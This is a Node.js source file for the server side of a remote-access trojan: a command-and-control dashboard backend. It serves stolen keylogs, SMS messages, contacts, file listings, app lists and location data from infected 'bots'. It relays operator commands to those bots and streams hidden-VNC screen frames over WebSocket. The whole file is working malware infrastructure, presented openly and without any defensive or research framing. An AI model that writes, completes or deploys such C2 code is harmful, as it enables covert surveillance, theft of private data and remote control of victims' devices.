'use strict';

/**
 * server.js — RAT C2 operator dashboard backend
 *
 * WebSocket endpoints:
 *   /ws       — bot main channel (text JSON + binary VNC frames)
 *   /hvnc     — bot dedicated HVNC binary channel
 *   /operator — operator dashboard connection
 *
 * REST API:
 *   GET  /api/bots                    → all devices (db + online status)
 *   GET  /api/bots/:id/logs           → activity log
 *   GET  /api/bots/:id/keylogs        → keylogs
 *   GET  /api/bots/:id/sms            → cached SMS
 *   GET  /api/bots/:id/contacts       → cached contacts
 *   GET  /api/bots/:id/files          → cached file list (query: ?path=)
 *   GET  /api/bots/:id/apps           → cached app list
 *   GET  /api/bots/:id/location       → latest location
 *   POST /api/bots/:id/command        → send command { action, ...params }
 */

const express    = require('express');
const http       = require('http');
const path       = require('path');
const { WebSocketServer, OPEN } = require('ws');
const { URL }    = require('url');

const bm = require('./botManager');
const db = require('./db');

// ── Config ─────────────────────────────────────────────────────────────────────
const PORT    = parseInt(process.env.PORT  || '7771', 10);
const HOST    = process.env.HOST           || '0.0.0.0';

// ── Express ────────────────────────────────────────────────────────────────────
const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ── REST API ───────────────────────────────────────────────────────────────────

app.get('/api/bots', (_req, res) => {
  res.json(bm.onlineDeviceList());
});

app.get('/api/bots/:id/logs', (req, res) => {
  const limit = parseInt(req.query.limit || '200', 10);
  res.json(db.getLogs(req.params.id, limit));
});

app.get('/api/bots/:id/keylogs', (req, res) => {
  const limit = parseInt(req.query.limit || '500', 10);
  res.json(db.getKeylogs(req.params.id, limit));
});

app.delete('/api/bots/:id/keylogs', (req, res) => {
  db.clearKeylogs(req.params.id);
  res.json({ ok: true });
});

app.get('/api/bots/:id/sms', (req, res) => {
  res.json(db.getSms(req.params.id) || []);
});

app.get('/api/bots/:id/contacts', (req, res) => {
  res.json(db.getContacts(req.params.id) || []);
});

app.get('/api/bots/:id/files', (req, res) => {
  const p = req.query.path || '/';
  res.json(db.getFileList(req.params.id, p) || []);
});

app.get('/api/bots/:id/apps', (req, res) => {
  res.json(db.getApps(req.params.id) || []);
});

app.get('/api/bots/:id/location', (req, res) => {
  res.json(db.getLatestLocation(req.params.id) || null);
});

app.post('/api/bots/:id/command', (req, res) => {
  const { action, ...params } = req.body;
  if (!action) return res.status(400).json({ error: 'missing action' });
  const entry = bm.bots.get(req.params.id);
  if (!entry || entry.ws.readyState !== OPEN) {
    return res.status(503).json({ error: 'bot not connected' });
  }
  let result = false;
  try {
    entry.ws.send(JSON.stringify({ action, ...params }));
    result = true;
  } catch (e) {
    return res.status(500).json({ error: `send failed: ${e.message}` });
  }
  if (!result) return res.status(500).json({ error: 'send failed' });
  res.json({ ok: true });
});

// ── HTTP server ────────────────────────────────────────────────────────────────
const server = http.createServer(app);

// ── WebSocket servers (share the same HTTP server, differentiated by path) ─────
const wss      = new WebSocketServer({ noServer: true }); // /ws — bot main
const wssHvnc  = new WebSocketServer({ noServer: true }); // /hvnc — bot HVNC
const wssOp    = new WebSocketServer({ noServer: true }); // /operator — dashboard

server.on('upgrade', (req, socket, head) => {
  const { pathname } = new URL(req.url, `http://${req.headers.host}`);

  if (pathname === '/ws') {
    wss.handleUpgrade(req, socket, head, (ws) => wss.emit('connection', ws, req));
  } else if (pathname === '/hvnc') {
    wssHvnc.handleUpgrade(req, socket, head, (ws) => wssHvnc.emit('connection', ws, req));
  } else if (pathname === '/operator') {
    wssOp.handleUpgrade(req, socket, head, (ws) => wssOp.emit('connection', ws, req));
  } else {
    socket.destroy();
  }
});

// ── Bot main channel (/ws) ─────────────────────────────────────────────────────
wss.on('connection', (ws, req) => {
  const url = new URL(req.url, `http://localhost`);
  const deviceId = url.searchParams.get('device_id');

  if (!deviceId) { ws.close(4000, 'missing device_id'); return; }

  bm.registerBot(deviceId, ws);
  console.log(`[BOT] ✓ ${deviceId} connected (main)`);

  ws.on('message', (data, isBinary) => {
    if (isBinary) {
      // VNC binary frame — relay to subscribed operators
      bm.handleBotBinaryFrame(deviceId, data instanceof Buffer ? data : Buffer.from(data));
    } else {
      // Text JSON — parse and forward
      bm.handleBotMessage(deviceId, data.toString('utf8'));
    }
  });

  ws.on('close', () => {
    console.log(`[BOT] × ${deviceId} disconnected (main)`);
    bm.unregisterBot(deviceId);
  });

  ws.on('error', (err) => {
    console.error(`[BOT] ! ${deviceId} error: ${err.message}`);
    bm.unregisterBot(deviceId);
  });
});

// ── Bot HVNC channel (/hvnc) ───────────────────────────────────────────────────
wssHvnc.on('connection', (ws, req) => {
  const url = new URL(req.url, `http://localhost`);
  const deviceId = url.searchParams.get('device_id');
  const ch       = url.searchParams.get('ch');

  if (!deviceId) { ws.close(4000, 'missing device_id'); return; }

  bm.registerHvncBot(deviceId, ws);
  console.log(`[HVNC] ✓ ${deviceId} connected`);

  ws.on('message', (data, isBinary) => {
    if (isBinary) {
      bm.handleHvncBinaryFrame(deviceId, data instanceof Buffer ? data : Buffer.from(data));
    }
    // HVNC channel only receives binary frames from bot; text messages ignored
  });

  ws.on('close', () => {
    console.log(`[HVNC] × ${deviceId} disconnected`);
    bm.unregisterHvncBot(deviceId);
  });

  ws.on('error', (err) => {
    console.error(`[HVNC] ! ${deviceId} error: ${err.message}`);
    bm.unregisterHvncBot(deviceId);
  });
});

// ── Operator channel (/operator) ───────────────────────────────────────────────
wssOp.on('connection', (ws, req) => {
  console.log(`[OP] operator connected`);
  bm.registerOperator(ws);

  ws.on('message', (data) => {
    const raw = data.toString('utf8');
    const result = bm.handleOperatorMessage(ws, raw);
    if (!result.ok) {
      try {
        ws.send(JSON.stringify({ type: 'ERROR', error: result.error }));
      } catch (_) {}
    }
  });

  ws.on('close', () => {
    console.log(`[OP] operator disconnected`);
    bm.unregisterOperator(ws);
  });

  ws.on('error', (err) => {
    console.error(`[OP] error: ${err.message}`);
    bm.unregisterOperator(ws);
  });
});

// ── Start ──────────────────────────────────────────────────────────────────────
server.listen(PORT, HOST, () => {
  console.log(`┌─────────────────────────────────────────────────────┐`);
  console.log(`│  RAT Dashboard C2 Server                            │`);
  console.log(`│  Listening on  http://${HOST}:${PORT}                 │`);
  console.log(`│  Bot WS        ws://${HOST}:${PORT}/ws               │`);
  console.log(`│  HVNC WS       ws://${HOST}:${PORT}/hvnc             │`);
  console.log(`│  Operator WS   ws://${HOST}:${PORT}/operator         │`);
  console.log(`└─────────────────────────────────────────────────────┘`);
});

// ── Graceful shutdown ──────────────────────────────────────────────────────────
process.on('SIGINT',  () => { server.close(); process.exit(0); });
process.on('SIGTERM', () => { server.close(); process.exit(0); });
